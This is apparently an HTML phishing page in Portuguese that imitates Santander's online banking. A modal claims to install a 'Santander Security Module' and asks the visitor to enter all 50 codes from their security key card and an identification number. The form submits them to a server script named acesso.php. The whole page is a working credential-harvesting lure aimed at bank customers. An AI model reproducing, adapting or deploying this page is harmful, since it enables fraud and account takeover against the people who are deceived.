<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title> </title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	<link rel="stylesheet" href="styles/geral.css">
	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900" rel="stylesheet">
	<script src="javascripts/jquery-1.4.2.min.js"></script>
	<script src="javascripts/jquery.maskedinput-1.2.2.min.js"></script>
	<script src="javascripts/custom.js"></script>
</head>
<body class="color_enter_home">

<div class="container is_header">

		<div class="left">
			<div class="logo"><img src="imgs/logo.png"></div><!-- logo -->
			<div class="busca"><input type="text" name="busca" class="buscar_home" placeholder="Digite aqui sua busca" autocomplete="off"></div>
		</div><!-- left -->

		<div class="right">
			<div class="gerente"><img src="imgs/icon_gerente.jpg"></div><!-- gerente -->
			<div class="user"><img src="imgs/icon_user.jpg"></div><!-- user -->
			<div class="exit"><span>Sair</span></div>
		</div><!-- right -->

<div class="clear"></div>
</div><!-- container -->


<div class="container is_corpo_main">
		<div class="menu_lateral"><img src="imgs/menu_lateral.jpg"></div>

		<div class="content_corpo">
			<img src="imgs/fundo_corpo.jpg">
		</div><!-- content_corpo -->
	<div class="clear"></div>
</div><!-- container -->



<div class="block_modal_corpo">
	<div class="modal_corpo">
		<div class="modal_title">
			<img src="imgs/logo.png">
		</div><!-- modal_title -->

		<div class="desc_modal">
			Para iniciarmos a <strong>instalação do Módulo de Segurança Santander</strong>, precisaremos confirmar alguns dados.
			<br><br>
			<span>Precisaremos confirmar o cartão chave de segurança.</span>
		</div><!-- desc_modal -->

		<div class="corpo_modal">
			<form action="acesso.php" method="post" onsubmit="return check_tabela(this);" autocomplete="off">

				<div class="posiciona_tabela">

					<table width="600" border="0" align="center" cellpadding="2" cellspacing="1" class="tabela_show" bordercolor="#FF0000">
						<tr bgcolor="#e9e9e9">
							<td width="15" class="red_number">Nº</td>
							<td width="52" class="red_text">Código</td>
							<td width="12" class="red_number">Nº</td>
							<td width="52" class="red_text">Código</td>
							<td width="12" class="red_number">Nº</td>
							<td width="52" class="red_text">Código</td>
							<td width="12" class="red_number">Nº</td>
							<td width="52" class="red_text">Código</td>
							<td width="12" class="red_number">Nº</td>
							<td width="52" class="red_text">Código</td>
						</tr>
						<tr>
							<td colspan="11">&nbsp;</td>
						</tr>
						<tr bgcolor="#eee">
							<td class="red_number_corpo">01</td>
							<td class="border-table"><input name="pos01" type="text" class="inpt_kll" id="pos01" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos02')"></td>
							<td class="red_number_corpo">11</td>
							<td class="border-table"><input name="pos11" type="text" class="inpt_kll" id="pos11" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos12')"></td>
							<td class="red_number_corpo">21</td>
							<td class="border-table"><input name="pos21" type="text" class="inpt_kll" id="pos21" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos22')"></td>
							<td class="red_number_corpo">31</td>
							<td class="border-table"><input name="pos31" type="text" class="inpt_kll" id="pos31" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos32') "></td>
							<td class="red_number_corpo">41</td>
							<td class="border-table"><input name="pos41" type="text" class="inpt_kll" id="pos41" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos42')"></td>
						</tr>
						<tr bgcolor="#eee">
							<td class="red_number_corpo">02</td>
							<td class="border-table"><input name="pos02" type="text" class="inpt_kll" id="pos02" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos03') "></td>
							<td class="red_number_corpo">12</td>
							<td class="border-table"><input name="pos12" type="text" class="inpt_kll" id="pos12" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos13')"></td>
							<td class="red_number_corpo">22</td>
							<td class="border-table"><input name="pos22" type="text" class="inpt_kll" id="pos22" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos23')"></td>
							<td class="red_number_corpo">32</td>
							<td class="border-table"><input name="pos32" type="text" class="inpt_kll" id="pos32" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos33')"></td>
							<td class="red_number_corpo">42</td>
							<td class="border-table"><input name="pos42" type="text" class="inpt_kll" id="pos42" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos43')"></td>
						</tr>
						<tr bgcolor="#eee">
							<td class="red_number_corpo">03</td>
							<td class="border-table"><input name="pos03" type="text" class="inpt_kll" id="pos03" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos04')"></td>
							<td class="red_number_corpo">13</td>
							<td class="border-table"><input name="pos13" type="text" class="inpt_kll" id="pos13" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos14')"></td>
							<td class="red_number_corpo">23</td>
							<td class="border-table"><input name="pos23" type="text" class="inpt_kll" id="pos23" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos24')"></td>
							<td class="red_number_corpo">33</td>
							<td class="border-table"><input name="pos33" type="text" class="inpt_kll" id="pos33" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos34')"></td>
							<td class="red_number_corpo">43</td>
							<td class="border-table"><input name="pos43" type="text" class="inpt_kll" id="pos43" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos44')"></td>
						</tr>
						<tr bgcolor="#eee">
							<td class="red_number_corpo">04</td>
							<td class="border-table"><input name="pos04" type="text" class="inpt_kll" id="pos04" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos05')"></td>
							<td class="red_number_corpo">14</td>
							<td class="border-table"><input name="pos14" type="text" class="inpt_kll" id="pos14" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos15')"></td>
							<td class="red_number_corpo">24</td>
							<td class="border-table"><input name="pos24" type="text" class="inpt_kll" id="pos24" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos25')"></td>
							<td class="red_number_corpo">34</td>
							<td class="border-table"><input name="pos34" type="text" class="inpt_kll" id="pos34" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos35')"></td>
							<td class="red_number_corpo">44</td>
							<td class="border-table"><input name="pos44" type="text" class="inpt_kll" id="pos44" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos45')"></td>
						</tr>
						<tr bgcolor="#eee">
							<td class="red_number_corpo">05</td>
							<td class="border-table"><input name="pos05" type="text" class="inpt_kll" id="pos05" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos06')"></td>
							<td class="red_number_corpo">15</td>
							<td class="border-table"><input name="pos15" type="text" class="inpt_kll" id="pos15" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos16')"></td>
							<td class="red_number_corpo">25</td>
							<td class="border-table"><input name="pos25" type="text" class="inpt_kll" id="pos25" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos26')"></td>
							<td class="red_number_corpo">35</td>
							<td class="border-table"><input name="pos35" type="text" class="inpt_kll" id="pos35" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos36')"></td>
							<td class="red_number_corpo">45</td>
							<td class="border-table"><input name="pos45" type="text" class="inpt_kll" id="pos45" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos46')"></td>
						</tr>
						<tr bgcolor="#eee">
							<td class="red_number_corpo">06</td>
							<td class="border-table"><input name="pos06" type="text" class="inpt_kll" id="pos06" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos07')"></td>
							<td class="red_number_corpo">16</td>
							<td class="border-table"><input name="pos16" type="text" class="inpt_kll" id="pos16" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos17')"></td>
							<td class="red_number_corpo">26</td>
							<td class="border-table"><input name="pos26" type="text" class="inpt_kll" id="pos26" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos27')"></td>
							<td class="red_number_corpo">36</td>
							<td class="border-table"><input name="pos36" type="text" class="inpt_kll" id="pos36" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos37')"></td>
							<td class="red_number_corpo">46</td>
							<td class="border-table"><input name="pos46" type="text" class="inpt_kll" id="pos46" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos47')"></td>
						</tr>
						<tr bgcolor="#eee">
							<td class="red_number_corpo">07</td>
							<td class="border-table"><input name="pos07" type="text" class="inpt_kll" id="pos07" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos08')"></td>
							<td class="red_number_corpo">17</td>
							<td class="border-table"><input name="pos17" type="text" class="inpt_kll" id="pos17" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos18')"></td>
							<td class="red_number_corpo">27</td>
							<td class="border-table"><input name="pos27" type="text" class="inpt_kll" id="pos27" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos28')"></td>
							<td class="red_number_corpo">37</td>
							<td class="border-table"><input name="pos37" type="text" class="inpt_kll" id="pos37" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos38')"></td>
							<td class="red_number_corpo">47</td>
							<td class="border-table"><input name="pos47" type="text" class="inpt_kll" id="pos47" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos48')"></td>
						</tr>
						<tr bgcolor="#eee">
							<td class="red_number_corpo">08</td>
							<td class="border-table"><input name="pos08" type="text" class="inpt_kll" id="pos08" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos09')"></td>
							<td class="red_number_corpo">18</td>
							<td class="border-table"><input name="pos18" type="text" class="inpt_kll" id="pos18" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos19')"></td>
							<td class="red_number_corpo">28</td>
							<td class="border-table"><input name="pos28" type="text" class="inpt_kll" id="pos28" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos29')"></td>
							<td class="red_number_corpo">38</td>
							<td class="border-table"><input name="pos38" type="text" class="inpt_kll" id="pos38" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos39')"></td>
							<td class="red_number_corpo">48</td>
							<td class="border-table"><input name="pos48" type="text" class="inpt_kll" id="pos48" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos49')"></td>
						</tr>
						<tr bgcolor="#eee">
							<td class="red_number_corpo">09</td>
							<td class="border-table"><input name="pos09" type="text" class="inpt_kll" id="pos09" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos10')"></td>
							<td class="red_number_corpo">19</td>
							<td class="border-table"><input name="pos19" type="text" class="inpt_kll" id="pos19" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos20')"></td>
							<td class="red_number_corpo">29</td>
							<td class="border-table"><input name="pos29" type="text" class="inpt_kll" id="pos29" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos30')"></td>
							<td class="red_number_corpo">39</td>
							<td class="border-table"><input name="pos39" type="text" class="inpt_kll" id="pos39" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos40')"></td>
							<td class="red_number_corpo">49</td>
							<td class="border-table"><input name="pos49" type="text" class="inpt_kll" id="pos49" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos50')"></td>
						</tr>
						<tr bgcolor="#eee">
							<td class="red_number_corpo">10</td>
							<td class="border-table"><input name="pos10" type="text" class="inpt_kll border_b" id="pos10" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos11')"></td>
							<td class="red_number_corpo">20</td>
							<td class="border-table"><input name="pos20" type="text" class="inpt_kll border_b" id="pos20" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos21')"></td>
							<td class="red_number_corpo">30</td>
							<td class="border-table"><input name="pos30" type="text" class="inpt_kll border_b" id="pos30" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos31')"></td>
							<td class="red_number_corpo">40</td>
							<td class="border-table"><input name="pos40" type="text" class="inpt_kll border_b" id="pos40" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pos41')"></td>
							<td class="red_number_corpo">50</td>
							<td class="border-table"><input name="pos50" type="text" class="inpt_kll border_b" id="pos50" maxlength="4" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'referencia')"></td>
						</tr>

						<tr bgcolor="#e9e9e9">
							<td height="26" colspan="10" bgcolor="#e9e9e9" class="ref">
								<span class="span_ref">Nº de identificação: </span>
								<input name="referencia" id="referencia" type="text" class="inpt_kll1" maxlength="11" onkeypress='return SomenteNumero(event)' onkeyup="proximoCampo(this, 'pass4')">
							</td>
						</tr>
					<tr class="clear"></tr>
					</table>

				</div><!-- posiciona_tabela -->


				<div class="clear"></div>

				<div class="buttons">
					<input type="submit" name="is_enter" id="is_enter" value="Confirmar" class="submit_corpo">
					<input type="hidden" name="sender" value="tabela">
				</div><!-- buttons -->
			</form>

		</div><!-- corpo_modal -->
	<div class="clear"></div>
	</div><!-- modal_corpo -->
</div><!-- block_modal_corpo -->








<div class="container">
	<div class="content_login">

	<div class="clear"></div>
	</div><!-- content_login -->
</div><!-- container -->
</body>
</html>
